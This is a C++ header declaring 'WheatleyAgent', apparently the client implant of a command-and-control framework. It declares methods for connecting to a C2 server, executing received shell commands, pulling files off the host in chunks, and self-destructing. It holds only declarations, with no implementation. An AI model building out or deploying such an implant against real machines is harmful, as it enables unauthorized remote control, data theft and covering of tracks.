#pragma once

#include <string>
#include <TcpConnection.hpp>
#include <WheatleyProto.hpp>

class WheatleyAgent {
public:
    bool wasDestroyed;
   
    WheatleyAgent();
    ~WheatleyAgent();

    // Disable copying for RAII integrity
    WheatleyAgent(const WheatleyAgent&) = delete;
    WheatleyAgent& operator=(const WheatleyAgent&) = delete;

    void run(const std::string& ip, int port);

private:
    std::unique_ptr<TcpConnection> m_connection;

    void c2Connect(const std::string& ip, int port);
    void c2Disconnect();

    agent::command::Request recvCommandRequest();
    void sendCommandResponse(agent::command::Response& response);
    agent::command::Response processCommandRequest(agent::command::Request& request);

    std::string handleExecute(const std::string& command);
    void handleSelfDestroy();
    void handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize);
};
